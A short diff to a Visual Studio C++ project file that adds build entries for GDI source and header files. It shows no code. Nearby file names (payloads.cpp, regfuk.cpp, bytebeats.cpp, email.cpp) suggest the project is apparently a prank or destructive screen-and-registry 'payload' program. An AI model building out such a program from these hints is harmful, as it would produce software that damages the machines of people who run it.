@@ -222,6 +222,8 @@
     <ClCompile Include="regfuk.cpp" />
     <ClCompile Include="start.cpp" />
     <ClCompile Include="..\third_party\quicklz\quicklz.c" />
+    <ClCompile Include="gdi\heavy.cpp" />
+    <ClCompile Include="gdi\light.cpp" />
     <ClCompile Include="payloads.cpp" />
     <ClCompile Include="utils\bytebeats.cpp" />
     <ClCompile Include="utils\email.cpp" />
@@ -256,6 +258,9 @@
     <ClInclude Include="easter\desk.h" />
     <ClInclude Include="easter\hw.h" />
     <ClInclude Include="easter\sys.h" />
+    <ClInclude Include="gdi\gdibuffer.h" />
+    <ClInclude Include="gdi\heavy.h" />
+    <ClInclude Include="gdi\light.h" />
     <ClInclude Include="payloads.h" />
     <ClInclude Include="regfuk.h" />
     <ClInclude Include="start.h" />
